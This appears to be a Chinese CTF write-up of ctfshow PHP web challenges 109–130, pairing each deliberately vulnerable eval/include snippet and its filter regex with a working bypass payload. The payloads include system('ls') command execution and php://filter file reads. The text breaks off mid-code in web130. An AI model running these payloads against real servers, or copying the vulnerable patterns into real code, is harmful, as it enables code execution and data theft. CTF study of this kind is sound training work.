<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-20">payload</h3>
<p>利用之前学到的类反射</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>
<h2 id="web110">web110</h2>
<h3 id="源码-21">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-21">payload</h3>
<p><a href="https://www.php.net/manual/zh/">PHP: PHP 手册 - Manual</a></p>
<p>相关利用方法都可以去查看手册</p>
<p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#FilesystemIterator：遍历文件的类</span><br><span class="line">#getcwd()会将当前工作目录的绝对路径返回</span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>
<h2 id="web111">web111</h2>
<h3 id="源码-22">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="payload-22">payload</h3>
<p>本题是变量覆盖，仅能传输字母进去，关键在于以v1变量的值为新的变量名，和以v2变量的值为新的变量名，变量b将地址传给了变量a，v1用来满足条件判断，v2用来执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>
<h2 id="web112">web112</h2>
<h3 id="源码-23">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-23">payload</h3>
<p>直接伪协议读取，更多可以查看手册去参考利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web113">web113</h2>
<h3 id="源码-24">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-24">payload</h3>
<p>限制了filter，改用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web114">web114</h2>
<h3 id="源码-25">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;师傅们居然tql都是非预期 哼！&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-25">payload</h3>
<p>又放开了filter的限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web115">web115</h2>
<h3 id="源码-26">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-26">payload</h3>
<p>trim()函数会去掉num里的%0a %0b %0d %20 %09</p>
<p>利用%0c换页符去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure>
<h2 id="web123">web123</h2>
<h3 id="源码-27">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-27">payload</h3>
<p>fl0g被禁了，无法使用，所有我们需要使用eval函数进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF_SHOW=&amp;CTF_SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>
<p>但是呢，这里有个新的问题，CTF_SHOW.COM含有.，无法正常进行解析为变量名</p>
<p>因此利用到一个特性，如果含有空格、+、[则会被转化为_，且后面的字符会正常保留，不被替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>
<h2 id="web125">web125</h2>
<h3 id="源码-28">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-28">payload</h3>
<p>禁止了部分方法，上一题的echo不能使用了</p>
<p>通过源码，可以看出highlight_file(_<em>FILE</em>_);仍然可以使用</p>
<p>因此可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#POST </span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</span><br><span class="line">#GET</span><br><span class="line">?1=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web126">web126</h2>
<h3 id="源码-29">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-29">payload</h3>
<p>$a=$_SERVER[‘argv’];</p>
<p>这边主要利用的是上面这个参数，因为可以看到已经将大部分可执行语句都进行了过滤</p>
<p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php">PHP: $argv - Manual</a></p>
<p>argv是一个传递给脚本的参数数组，可以利用这个参数，加上其获取的数组根据空格分割的特性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#GET</span><br><span class="line">?a=1+fl0g=flag_give_me</span><br><span class="line">#POST</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>
<h2 id="web127">web127</h2>
<h3 id="源码-30">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-30">payload</h3>
<p>对url参数进行检测，加号被过滤，因此使用%20绕过检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf%20show=ilove36d</span><br></pre></td></tr></table></figure>
<h2 id="web128">web128</h2>
<h3 id="源码-31">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-31">payload</h3>
<p>当php扩展目录下有php_gettext.dll时，可以使用_()函数，_()函数和gettext()函数类似，因此使用_()函数去对waf绕过，再利用call_user_func函数进行回调</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>
<h2 id="web129">web129</h2>
<h3 id="源码-32">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-32">payload</h3>
<p>stripos() 函数——查找字符串在另一字符串中第一次出现的位置（区分大小写），返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。因此需要传入一个包含ctfshow的字符串。</p>
<p>readfile() 函数读取一个文件，并写入到输出缓冲中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>此外，本题可以直接进行目录穿越，读取flag.php</p>
<h2 id="web130">web130</h2>
<h3 id="源码-33">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span 